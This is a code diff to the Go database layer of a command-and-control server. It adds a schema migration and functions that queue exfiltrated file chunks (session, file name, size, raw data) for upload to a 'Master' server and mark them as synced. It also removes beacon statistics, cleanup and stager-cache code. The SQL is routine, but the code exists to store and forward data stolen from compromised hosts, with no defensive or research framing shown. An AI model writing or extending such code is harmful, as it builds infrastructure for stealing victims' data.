@@ -4,7 +4,6 @@ package main
 
 import (
 	"database/sql"
-	"encoding/json"
 	"fmt"
 	"sync"
 	"time"
@@ -17,7 +16,7 @@ const (
 	DatabaseFileName = "c2_data.db"
 
 	// DatabaseSchemaVersion tracks the current schema version
-	DatabaseSchemaVersion = 2
+	DatabaseSchemaVersion = 3
 )
 
 // Database wraps the SQL database connection and provides C2-specific operations
@@ -144,6 +143,12 @@ func (d *Database) applyMigrations(fromVersion int) error {
 		}
 	}
 
+	if fromVersion < 3 {
+		if err := d.migration3ExfilSync(); err != nil {
+			return fmt.Errorf("migration 3 failed: %w", err)
+		}
+	}
+
 	// Record schema version
 	_, err := d.db.Exec(`
 		INSERT INTO schema_version (version, applied_at, description)
@@ -264,6 +269,16 @@ func (d *Database) migration2ExfilSchema() error {
 	`
 
 	_, err := d.db.Exec(schema)
+	return err
+}
+
+// migration3ExfilSync adds a synced column to exfil_chunks to track Master upload status
+func (d *Database) migration3ExfilSync() error {
+	// Add synced column to exfil_chunks
+	_, err := d.db.Exec(`
+		ALTER TABLE exfil_chunks ADD COLUMN synced INTEGER DEFAULT 0;
+		CREATE INDEX IF NOT EXISTS idx_exfil_chunks_synced ON exfil_chunks(synced);
+	`)
 	return err
 }
 
@@ -828,265 +843,59 @@ func (d *Database) GetAllTasksWithLimit(limit int) ([]*Task, error) {
 	return tasks, rows.Err()
 }
 
-// Utility functions
-
-// GetDatabaseStats returns database statistics
-func (d *Database) GetDatabaseStats() (map[string]interface{}, error) {
+// GetUnsyncedExfilChunks retrieves all chunks that haven't been uploaded to Master
+func (d *Database) GetUnsyncedExfilChunks(limit int) ([]map[string]interface{}, error) {
 	d.mutex.RLock()
 	defer d.mutex.RUnlock()
 
-	stats := make(map[string]interface{})
-
-	// Count beacons
-	var beaconCount int
-	err := d.db.QueryRow("SELECT COUNT(*) FROM beacons").Scan(&beaconCount)
-	if err != nil {
-		return nil, err
-	}
-	stats["beacons"] = beaconCount
-
-	// Count active beacons (last 24 hours)
-	var activeBeaconCount int
-	cutoff := time.Now().Add(-24 * time.Hour).Unix()
-	err = d.db.QueryRow("SELECT COUNT(*) FROM beacons WHERE last_seen > ? AND status = 'active'", cutoff).Scan(&activeBeaconCount)
-	if err != nil {
-		return nil, err
-	}
-	stats["active_beacons"] = activeBeaconCount
-
-	// Count tasks
-	var taskCount int
-	err = d.db.QueryRow("SELECT COUNT(*) FROM tasks").Scan(&taskCount)
-	if err != nil {
-		return nil, err
-	}
-	stats["tasks"] = taskCount
-
-	// Count by status
-	rows, err := d.db.Query("SELECT status, COUNT(*) FROM tasks GROUP BY status")
+	rows, err := d.db.Query(`
+		SELECT c.session_id, c.chunk_index, c.data, s.job_id, s.file_name, s.file_size, s.total_chunks
+		FROM exfil_chunks c
+		JOIN exfil_sessions s ON c.session_id = s.session_id
+		WHERE c.synced = 0
+		LIMIT ?
+	`, limit)
 	if err != nil {
 		return nil, err
 	}
 	defer rows.Close()
 
-	tasksByStatus := make(map[string]int)
+	var chunks []map[string]interface{}
 	for rows.Next() {
-		var status string
-		var count int
-		if err := rows.Scan(&status, &count); err != nil {
+		var sessionID, jobID, fileName string
+		var chunkIndex, totalChunks int
+		var fileSize int64
+		var data []byte
+
+		if err := rows.Scan(&sessionID, &chunkIndex, &data, &jobID, &fileName, &fileSize, &totalChunks); err != nil {
 			return nil, err
 		}
-		tasksByStatus[status] = count
-	}
-	stats["tasks_by_status"] = tasksByStatus
 
-	// Database file size
-	var pageCount, pageSize int
-	err = d.db.QueryRow("PRAGMA page_count").Scan(&pageCount)
-	if err == nil {
-		d.db.QueryRow("PRAGMA page_size").Scan(&pageSize)
-		stats["db_size_bytes"] = pageCount * pageSize
+		chunks = append(chunks, map[string]interface{}{
+			"session_id":   sessionID,
+			"chunk_index":  chunkIndex,
+			"data":         data,
+			"job_id":       jobID,
+			"file_name":    fileName,
+			"file_size":    fileSize,
+			"total_chunks": totalChunks,
+		})
 	}
 
-	return stats, nil
+	return chunks, rows.Err()
 }
 
-// CleanupOldData removes old completed tasks and inactive beacons
-func (d *Database) CleanupOldData(retentionDays int) error {
-	d.mutex.Lock()
-	defer d.mutex.Unlock()
-
-	cutoff := time.Now().AddDate(0, 0, -retentionDays).Unix()
-
-	// Delete old completed tasks
-	result, err := d.db.Exec(`
-		DELETE FROM tasks
-		WHERE status = 'completed' AND completed_at < ?
-	`, cutoff)
-	if err != nil {
-		return err
-	}
-
-	deleted, _ := result.RowsAffected()
-	if deleted > 0 {
-		logf("[DB] Cleaned up %d old completed tasks", deleted)
-	}
-
-	// Mark inactive beacons
-	result, err = d.db.Exec(`
-		UPDATE beacons
-		SET status = 'inactive'
-		WHERE last_seen < ? AND status = 'active'
-	`, cutoff)
-	if err != nil {
-		return err
-	}
-
-	updated, _ := result.RowsAffected()
-	if updated > 0 {
-		logf("[DB] Marked %d beacons as inactive", updated)
-	}
-
-	return nil
-}
-
-// ExportBeaconData exports beacon data as JSON for backup/analysis
-func (d *Database) ExportBeaconData(beaconID string) ([]byte, error) {
-	beacon, err := d.GetBeacon(beaconID)
-	if err != nil {
-		return nil, err
-	}
-
-	tasks, err := d.GetTasksForBeacon(beaconID)
-	if err != nil {
-		return nil, err
-	}
-
-	export := map[string]interface{}{
-		"beacon": beacon,
-		"tasks":  tasks,
-	}
-
-	return json.MarshalIndent(export, "", "  ")
-}
-
-// Stager Chunk Cache Operations
-
-// CacheChunk stores a single chunk in local cache for instant retrieval
-func (d *Database) CacheChunk(sessionID string, chunkIndex int, chunkData string) error {
+// MarkExfilChunkSynced marks a chunk as successfully uploaded to Master
+func (d *Database) MarkExfilChunkSynced(sessionID string, chunkIndex int) error {
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
 	_, err := d.db.Exec(`
-		INSERT OR REPLACE INTO stager_chunk_cache (client_binary_id, chunk_index, chunk_data, cached_at)
-		VALUES (?, ?, ?, ?)
-	`, sessionID, chunkIndex, chunkData, time.Now().Unix())
+		UPDATE exfil_chunks SET synced = 1
+		WHERE session_id = ? AND chunk_index = ?
+	`, sessionID, chunkIndex)
 
 	return err
-}
-
-// GetCachedChunk retrieves a chunk from local cache
-func (d *Database) GetCachedChunk(sessionID string, chunkIndex int) (string, error) {
-	d.mutex.RLock()
-	defer d.mutex.RUnlock()
-
-	var chunkData string
-	err := d.db.QueryRow(`
-		SELECT chunk_data FROM stager_chunk_cache
-		WHERE client_binary_id = ? AND chunk_index = ?
-	`, sessionID, chunkIndex).Scan(&chunkData)
-
-	if err == sql.ErrNoRows {
-		return "", fmt.Errorf("chunk not found in cache")
-	}
-
-	return chunkData, err
-}
-
-// GetCachedBinaryID returns the client_binary_id for any cached binary (typically only one)
-func (d *Database) GetCachedBinaryID() (string, error) {
-	d.mutex.RLock()
-	defer d.mutex.RUnlock()
-
-	var clientBinaryID string
-	err := d.db.QueryRow(`
-		SELECT DISTINCT client_binary_id FROM stager_chunk_cache LIMIT 1
-	`).Scan(&clientBinaryID)
-
-	if err == sql.ErrNoRows {
-		return "", fmt.Errorf("no cached chunks available")
-	}
-
-	return clientBinaryID, err
-}
-
-// GetCachedChunkByBinaryID gets a chunk by client_binary_id and chunk index
-func (d *Database) GetCachedChunkByBinaryID(clientBinaryID string, chunkIndex int) (string, error) {
-	d.mutex.RLock()
-	defer d.mutex.RUnlock()
-
-	var chunkData string
-	err := d.db.QueryRow(`
-		SELECT chunk_data FROM stager_chunk_cache
-		WHERE client_binary_id = ? AND chunk_index = ?
-	`, clientBinaryID, chunkIndex).Scan(&chunkData)
-
-	if err == sql.ErrNoRows {
-		return "", fmt.Errorf("chunk %d not found in cache for binary %s", chunkIndex, clientBinaryID)
-	}
-
-	return chunkData, err
-}
-
-// CacheStagerChunks stores chunks in local cache for instant retrieval (batch operation)
-func (d *Database) CacheStagerChunks(clientBinaryID string, chunks []string) error {
-	d.mutex.Lock()
-	defer d.mutex.Unlock()
-
-	tx, err := d.db.Begin()
-	if err != nil {
-		return fmt.Errorf("failed to begin transaction: %w", err)
-	}
-	defer tx.Rollback()
-
-	// Clear existing cache for this binary
-	_, err = tx.Exec(`DELETE FROM stager_chunk_cache WHERE client_binary_id = ?`, clientBinaryID)
-	if err != nil {
-		return fmt.Errorf("failed to clear old cache: %w", err)
-	}
-
-	// Insert all chunks
-	stmt, err := tx.Prepare(`
-		INSERT INTO stager_chunk_cache (client_binary_id, chunk_index, chunk_data, cached_at)
-		VALUES (?, ?, ?, ?)
-	`)
-	if err != nil {
-		return fmt.Errorf("failed to prepare statement: %w", err)
-	}
-	defer stmt.Close()
-
-	now := time.Now().Unix()
-	for i, chunkData := range chunks {
-		_, err = stmt.Exec(clientBinaryID, i, chunkData, now)
-		if err != nil {
-			return fmt.Errorf("failed to cache chunk %d: %w", i, err)
-		}
-	}
-
-	if err = tx.Commit(); err != nil {
-		return fmt.Errorf("failed to commit transaction: %w", err)
-	}
-
-	logf("[DB] Cached %d chunks for client binary: %s", len(chunks), clientBinaryID)
-	return nil
-}
-
-// GetCachedChunkCount returns the number of cached chunks for a binary
-func (d *Database) GetCachedChunkCount(clientBinaryID string) (int, error) {
-	d.mutex.RLock()
-	defer d.mutex.RUnlock()
-
-	var count int
-	err := d.db.QueryRow(`
-		SELECT COUNT(*) FROM stager_chunk_cache WHERE client_binary_id = ?
-	`, clientBinaryID).Scan(&count)
-
-	return count, err
-}
-
-// ClearStagerCache removes all cached chunks (for cleanup/maintenance)
-func (d *Database) ClearStagerCache() error {
-	d.mutex.Lock()
-	defer d.mutex.Unlock()
-
-	result, err := d.db.Exec(`DELETE FROM stager_chunk_cache`)
-	if err != nil {
-		return err
-	}
-
-	deleted, _ := result.RowsAffected()
-	logf("[DB] Cleared %d cached chunks", deleted)
-	return nil
 }
 
 // Exfil session operations
